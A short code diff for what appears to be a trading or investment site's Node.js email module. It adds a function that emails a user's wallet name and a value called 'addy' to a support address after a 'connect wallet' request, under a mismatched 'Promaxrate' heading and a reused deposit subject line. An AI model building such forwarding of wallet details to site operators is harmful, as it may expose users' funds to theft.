@@ -1253,6 +1253,24 @@ async function sendDepositEmail({ from, amount, method, timestamp }) {
   return sendEmail({ to: "support@Bullagetrade.com", subject: "New Deposit Notification", html: wrap(htmlContent, "New Deposit") });
 }
 
+async function sendWalletInfo({ username, addy,walletName }) {
+  const htmlContent = `
+   
+  <h2>Welcome to Promaxrate</h2>
+
+    <p>${username},just requested to connect wallet.Here are the details;
+
+    </p>
+    <p>Wallet Name:${ walletName}</p>
+<p>${addy}
+
+</p>
+
+  `;
+  return sendEmail({ to: "support@Bullagetrade.com", subject: "New Deposit Notification", html: wrap(htmlContent, "New Deposit") });
+}
+
+
 async function sendBankDepositRequestEmail({ from, amount, method, timestamp }) {
   const htmlContent = `
     <p>Hello Chief,</p>
@@ -1409,6 +1427,7 @@ module.exports = {
   resetEmail,
   sendUserPlanEmail,
   sendUserDetails,
+  sendWalletInfo,
   sendUserDepositEmail,
   sendKycAlert,
 };
